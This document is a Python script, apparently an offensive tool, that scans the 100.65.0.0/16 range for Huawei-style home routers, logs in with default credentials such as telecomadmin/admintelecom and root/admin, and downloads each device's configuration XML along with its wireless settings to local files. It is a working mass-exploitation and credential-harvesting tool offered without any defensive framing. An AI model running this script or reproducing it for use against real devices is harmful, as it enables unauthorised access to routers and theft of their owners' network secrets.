import requests, re, base64

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

cookies = {
    'Cookie': 'body:Language:english:id=-1',
}
prototype="https://"

def getUsername(host):
    gotUsername = requests.get(prototype+host+'/html/amp/wlanbasic/WlanBasic.asp', cookies=cookies, verify=False, timeout=1).text
    findUsername = re.findall(',"ath0","1",".*WPAand11i', gotUsername)
    return findUsername[0].replace(',"ath0","1","', "").replace('","1","32","1","WPAand11i', "").replace('","0","32","1","WPAand11i',"")

def getXML(host):
    getToken = requests.get(prototype+host+'/html/ssmp/cfgfile/cfgfile.asp', cookies=cookies, verify=False, timeout=1).text
    findToken = re.findall('RequestToken(?:(?!RequestToken).)*?"', getToken)
    gotToken = findToken[0].replace("RequestToken=", "").replace('"',"")
    data = 'x.X_HW_Token='+gotToken
    xmlResponse = requests.post(prototype+host+'/html/ssmp/cfgfile/cfgfiledown.cgi?&RequestFile=html/ssmp/cfgfile/cfgfile.asp', cookies=cookies, data=data, verify=False, timeout=5)
    return xmlResponse.text

def dumpDetails(host):
    cookies['Cookie'] = 'body:Language:english:id=-1'
    toBrute = [{"username": "telecomadmin", "password": "admintelecom"}, {"username": "root", "password": "admin"}]
    print(f"{bcolors.OKBLUE}[-] Testing Host : {host} ")

    getTimer = requests.get(prototype+host+'/asp/GetRandCount.asp', verify=False, timeout=1);
    i=0
    data = 'UserName='+toBrute[i]['username']+'&PassWord=' + base64.b64encode(toBrute[i]['password'].encode('ascii')).decode('ascii').replace("=","")  +'&x.X_HW_Token=' + getTimer.text.replace("ï»¿","")
    getCookie = requests.post(prototype+host+'/login.cgi', cookies=cookies, data=data, verify=False, timeout=1)
    i+=1

    while 'Set-cookie' not in getCookie.headers and len(toBrute) != i :
        data = 'UserName='+toBrute[i]['username']+'&PassWord=' + base64.b64encode(toBrute[i]['password'].encode('ascii')).decode('ascii').replace("=","")  +'&x.X_HW_Token=' + getTimer.text.replace("ï»¿","")
        getCookie = requests.post(prototype+host+'/login.cgi', cookies=cookies, data=data, verify=False, timeout=1)
        i+=1
    if('Set-cookie' not in getCookie.headers):
        print(f"{bcolors.WARNING}[-] Password didn't matched for : {host}")

    
    cookies['Cookie'] = getCookie.headers['Set-cookie']
    return getXML(host)
for i in range(1, 255):
    for j in range(1, 255):
        try:
            link = "100.65."+str(i)+"."+str(j)+":80"
            gotData = dumpDetails(link)
            print(f"{bcolors.OKGREEN}[+] Dumped from : {prototype}{link} ")
            
            with open("./dumpXMLS/"+link+".xml", 'w') as f:
                f.write(gotData)
        except:
            print(f"{bcolors.FAIL}[-] Host Down : {prototype}{link} ")